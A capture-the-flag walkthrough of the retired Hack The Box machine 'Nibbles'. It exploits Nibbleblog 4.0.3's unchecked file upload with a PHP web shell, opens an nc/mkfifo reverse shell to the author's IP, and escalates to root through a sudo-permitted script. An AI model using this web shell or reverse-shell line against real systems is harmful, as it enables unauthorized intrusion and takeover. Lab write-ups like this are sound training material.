# Nibbles

This is the write-up for the box Nibbles that got retired at the 30th June 2018.
My IP address was 10.10.14.34 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.75    nibbles.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/nibbles.nmap 10.10.10.75
```

```markdown
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Checking HTTP (Port 80)

On the web page there is a text that says **"Hello World"** and a comment in the source code:
```markdown
<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

When browsing to _/nibbleblog_ it displays a blog page that is **"Powered by Nibbleblog"**.
[Nibbleblog](https://github.com/dignajar/nibbleblog) is an open-source CMS that works with PHP.

Looking through the GitHub repository, we can browse to the files and directories on the web page and can find out the version by going to the _/nibbleblog/admin/boot/rules/98-constants.bit_ file and looking at source code. As this is a _bit file_ if shows the source code of the PHP code.
It discloses some information about the software:
```markdown
// =====================================================================
//	SYSTEM INFORMATION
// =====================================================================
define('NIBBLEBLOG_VERSION',		'4.0.3');
define('NIBBLEBLOG_NAME',			'Coffee');
define('NIBBLEBLOG_RELEASE_DATE',	'01/04/2014');
define('NIBBLEBLOG_BUILD',			1396309604);
```

So lets search for vulnerabilities for **Nibbleblog 4.0.3**:
```markdown
searchsploit nibbleblog
```

There is an exploit called **Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)** which we take a look at.
It references a [Blog post from Curesec](https://curesec.com/blog/article/blog/NibbleBlog-403-Code-Execution-47.html) where it says:
> When uploading image files via the "My image" plugin - which is delivered with NibbleBlog by default - , NibbleBlog 4.0.3 keeps the original extension of uploaded files. This extension or the actual file type are not checked, thus it is possible to upload PHP files and gain code execution.

To exploit this vulnerability, it is required to obtain login credentials first.
After trying out some easy-to-guess and default passwords, the following credentials work:
```markdown
Username: admin
Password: nibbles
```

On the admin panel we need to activate the _My Image plugin_ and then we can upload an image on the box:

![Uploading file](https://kyuu-ji.github.io/htb-write-up/nibbles/nibbles_web-1.png)

The file _cmd.php_ has the magic byte for a GIF at the beginning and code for command execution with PHP:
```markdown
GIF8;
<?php echo system($\_REQUEST['cmd']); ?>
```

The warnings can be ignored and the uploaded file can be found in the directory _/nibbleblog/content/private/plugins/my_image/image.php_.
Lets try to execute commands:
```markdown
http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php?cmd=whoami
```

This outputs the username _nibbler_ and confirms that code execution works. The next step is to start a reverse shell:
```markdown
GET /nibbleblog/content/private/plugins/my_image/image.php?cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.34 9001 >/tmp/f

# URL-encoded
GET /nibbleblog/content/private/plugins/my_image/image.php?cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.34+9001+>/tmp/f
```

After sending this request, the listener on my IP and port 9001 starts a session as _nibbler_.

## Privilege Escalation

Checking the root privileges with `sudo -l` displays that the user can run a shell script in the home directory without a password:
```markdown
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

So lets create the file _monitor.sh_ in the directory _/home/nibbler/personal/stuff/_, make it executable and start a shell with it:
```bash
# Title: monitor.sh

#!/bin/bash
bash
```

Execute the script:
```markdown
sudo ./monitor.sh
```

After executing it, a shell as root starts!
